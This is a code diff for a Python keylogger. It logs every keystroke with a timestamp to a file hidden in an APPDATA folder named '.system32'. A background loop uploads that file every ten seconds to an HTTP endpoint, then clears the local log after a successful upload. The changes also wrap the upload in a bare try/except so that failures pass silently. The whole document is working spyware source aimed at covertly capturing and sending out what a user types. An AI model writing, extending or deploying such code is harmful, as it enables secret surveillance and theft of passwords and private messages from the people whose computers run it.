@@ -8,7 +8,12 @@ import requests
 def on_press(key):
     strick_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     final_str = strick_time + " -- " + str(key) + "\n"
-    save_log(final_str)
+    appdata = os.getenv("APPDATA")
+    dir_name = ".system32"
+    log_file = "keylogs.txt"
+    file_location = os.path.join(appdata, dir_name, log_file)
+    with open(file_location, "a") as file:
+        file.write(final_str)
 
 def check_path():
     appdata = os.getenv("APPDATA")
@@ -19,28 +24,24 @@ def check_path():
     else:
         os.mkdir(full_path)
 
-def save_log(string):
-    appdata = os.getenv("APPDATA")
-    dir_name = ".system32"
-    log_file = "keylogs.txt"
-    file_location = os.path.join(appdata, dir_name, log_file)
-    with open(file_location, "a") as file:
-        file.write(string)
-
 def send_log():
         url = "http://localhost:3000/upload"
         appdata = os.getenv("APPDATA")
         dir_name = ".system32"
         log_file = "keylogs.txt"
         while True:
-                time.sleep(10) #Needs adjustment
-                file_location = os.path.join(appdata, dir_name, log_file)
-                files = {
-                    'file': open(file_location, 'rb')
-                }
-                response = requests.post(url, files=files)
-                print(response.status_code)
-
+                try:
+                    time.sleep(10) #Needs adjustment
+                    file_location = os.path.join(appdata, dir_name, log_file)
+                    files = {
+                        'file': open(file_location, 'rb')
+                    }
+                    response = requests.post(url, files=files)
+                    if response.status_code == 200:
+                        with open(file_location, "w") as log:
+                            log.write("")
+                except:
+                    pass
 def start_listener():
         with Listener(on_press=on_press) as listener:
                 listener.join()
